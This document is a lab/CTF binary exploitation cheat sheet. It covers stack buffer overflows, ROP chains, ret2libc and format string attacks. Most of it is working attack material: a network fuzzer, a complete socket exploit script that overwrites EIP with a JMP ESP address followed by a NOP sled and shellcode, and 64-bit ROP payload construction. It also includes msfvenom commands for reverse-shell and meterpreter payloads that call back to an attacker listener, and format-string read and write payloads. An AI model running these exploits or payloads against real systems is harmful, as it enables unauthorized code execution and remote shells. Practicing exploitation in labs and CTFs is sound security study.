# Binary Exploitation Reference (Lab/CTF)

> **Scope:** Lab and CTF environments only. Binary exploitation against
> production systems requires explicit authorization and is rarely in scope.

## Buffer Overflow Basics

### Methodology
```
1. Fuzz → find crash point
2. Determine offset → exact EIP/RIP control
3. Identify bad characters → filter from shellcode
4. Find return address → JMP ESP gadget or libc address
5. Generate shellcode → msfvenom
6. Build exploit → padding + return address + NOP sled + shellcode
7. Test and adjust
```

### Step 1: Fuzzing
```python
#!/usr/bin/env python3
# Simple TCP fuzzer
import socket, time, sys

target = "10.10.10.10"
port = 9999
prefix = "COMMAND "  # adjust to target protocol
buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        s.recv(1024)
        print(f"Sending {len(buffer)} bytes...")
        s.send((prefix + buffer + "\r\n").encode())
        s.recv(1024)
        s.close()
        buffer += "A" * 100
        time.sleep(1)
    except:
        print(f"Crashed at {len(buffer)} bytes")
        sys.exit(0)
```

### Step 2: Find Exact Offset
```bash
# Generate pattern
msf-pattern_create -l 3000

# After crash, find offset from EIP value
msf-pattern_offset -l 3000 -q <EIP_VALUE>
# Example: msf-pattern_offset -l 3000 -q 386F4337
# → Exact offset at 2003
```

### Step 3: Bad Character Detection
```python
# Generate all bytes except \x00
badchars = b""
for i in range(1, 256):
    badchars += bytes([i])

# Send: padding + badchars
# In debugger: compare ESP dump against expected sequence
# Missing/mangled bytes are bad chars
# Common bad chars: \x00 \x0a \x0d
```

### Step 4: Find Return Address
```bash
# In Immunity Debugger with mona.py
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Or find JMP ESP in loaded modules
!mona find -s "\xff\xe4" -m module.dll

# For Linux
ROPgadget --binary ./vuln_binary | grep "jmp esp"
ropper --file ./vuln_binary --search "jmp esp"
```

### Step 5: Generate Shellcode
```bash
# Linux reverse shell (x86)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f python -v shellcode

# Windows reverse shell (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f python -v shellcode

# Staged meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00' -f python -v shellcode
```

### Step 6: Complete Exploit
```python
#!/usr/bin/env python3
import socket, struct

target = "10.10.10.10"
port = 9999
offset = 2003

# msfvenom shellcode (replace with generated)
shellcode = b"\xdb\xce\xd9\x74\x24..."  # truncated

# JMP ESP address (little-endian)
eip = struct.pack("<I", 0x625011AF)

buffer = b"A" * offset          # padding to EIP
buffer += eip                    # overwrite EIP with JMP ESP
buffer += b"\x90" * 16          # NOP sled
buffer += shellcode              # payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send(b"COMMAND " + buffer + b"\r\n")
s.close()
```

---

## ROP Chains (NX/DEP Bypass)

### Concept
When the stack is non-executable (NX/DEP), chain existing code gadgets
to build functionality without injecting shellcode.

### ret2libc (Linux x86)
```bash
# Find libc addresses
ldd ./vuln_binary                           # libc path
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

# Exploit: system("/bin/sh")
# buffer + system_addr + exit_addr + binsh_addr
```

### ROP Gadget Finding
```bash
# ROPgadget
ROPgadget --binary ./vuln_binary --ropchain
ROPgadget --binary ./vuln_binary | grep "pop rdi ; ret"

# ropper
ropper --file ./vuln_binary --search "pop rdi"
ropper --file ./vuln_binary --chain execve
```

### 64-bit ROP (x86_64)
```python
# Calling convention: RDI, RSI, RDX, RCX, R8, R9
# system("/bin/sh") needs: pop rdi; ret → addr of "/bin/sh" → system()

from struct import pack

pop_rdi = pack("<Q", 0x0000000000401234)   # pop rdi; ret gadget
bin_sh  = pack("<Q", 0x00000000004a0000)   # address of "/bin/sh"
system  = pack("<Q", 0x0000000000401100)   # system@plt
ret     = pack("<Q", 0x000000000040101a)   # ret gadget (stack alignment)

payload = b"A" * offset
payload += ret              # stack alignment for movaps
payload += pop_rdi
payload += bin_sh
payload += system
```

---

## Format String Vulnerabilities

### Reading from Stack
```
%x.%x.%x.%x.%x            # leak stack values in hex
%p.%p.%p.%p.%p            # leak pointers
%s                          # read string from pointer on stack
AAAA%7$x                   # direct parameter access (find offset)
```

### Arbitrary Read
```
# Place address on stack, use %s to dereference
python3 -c "import sys; sys.stdout.buffer.write(b'\x48\xd0\xff\xff' + b'%4\$s')" | ./vuln
```

### Arbitrary Write (%n)
```
# %n writes number of chars printed so far to address on stack
# Write small values with %hhn (byte) or %hn (halfword)
AAAA%100x%7$n              # writes 104 to address 0x41414141
```

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `gdb` / `gdb-peda` / `pwndbg` | Debugging and exploit development |
| `checksec` | Check binary protections (NX, ASLR, canary, PIE) |
| `ROPgadget` | Find ROP gadgets in binaries |
| `ropper` | Alternative ROP gadget finder |
| `pwntools` | Python exploit development framework |
| `radare2` / `ghidra` | Reverse engineering |
| `ltrace` / `strace` | Library/system call tracing |
| `objdump` | Disassembly and section dumps |

### Quick Checks
```bash
checksec --file=./binary    # RELRO, Stack Canary, NX, PIE, ASLR
file ./binary               # architecture, linking
ldd ./binary                # shared libraries
strings ./binary | grep -i flag  # quick wins
```
